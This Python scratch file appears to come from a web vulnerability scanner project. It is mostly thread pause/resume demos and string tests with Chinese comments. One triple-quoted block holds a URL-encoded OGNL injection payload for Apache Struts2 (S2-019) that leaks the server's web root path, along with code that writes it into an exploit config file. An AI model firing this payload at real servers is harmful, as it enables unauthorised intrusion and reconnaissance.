'''import queue,threading
import time
from plugin.util import *


#

__flag = threading.Event()# 用于暂停线程的标识
__flag.set()
__running = threading.Event()# 用于停止线程的标识
__running.set()# 将running设置为True
def aa(dir):
    while __running.isSet():


        while not dir.empty():
            __flag.wait()
            print(dir.get())
            time.sleep(1)

print('2秒暂停')
dir = get_dict('exploit/dir/dir.txt')
for i in range(10):
    print(i)
    t = threading.Thread(target=aa,args=(dir,))

    t.start()
time.sleep(2)
print('2秒后重新开始')
__flag.clear()# 设置为False, 让线程阻塞
time.sleep(2)
print('restart')
print('2秒后停止')
#__flag.set()# 设置为True, 让线程停止阻塞
time.sleep(2)

__flag.set()# 将线程从暂停状态恢复, 如何已经暂停的话
time.sleep(0.01)
#__flag.set()
dir.queue.clear()

__running.clear()# 设置为False'''

# import urllib.request
#
# user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'
# headers = {'User-Agent': user_agent}
# a = urllib.request.Request('http://news.fjsen.com', headers=headers)
# b = urllib.request.urlopen(a)
# print(b.read().decode('utf-8'))

c = '\\u53d1\\u751f\\u7684'.replace('\\\\', '\\')

# b = '\u554a'
# a = b.encode('utf-8').decode()
# print(type('\u554a'))
# print(a)
'''
import os, urllib, configparser
import base64
import codecs
a = 'method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23parameters.web[0]),%23w.print(%23parameters.path[0]),%23w.print(%23path),1?%23xx:%23request.toString&pp=%2f&encoding=UTF-8&web=web&path=path%3a\n\n'
config = configparser.ConfigParser()
config.read('exploit/web/struts2/s2-019.conf')
cf = config.sections()

#a = base64.b64encode(a.encode('utf-8')).decode()
#a = codecs.encode(a.encode('utf-8'), 'hex_codec').decode()
print(a)
for i in cf:
    config.set(i, 'POST', a)
config.write(open('exploit/web/struts2/s2-019.conf','w'))

'''
a = 'a'
if a is not '':
    print(1)

head = {}
head['a'] = 'b'
head['b'] = 'c'
print(head)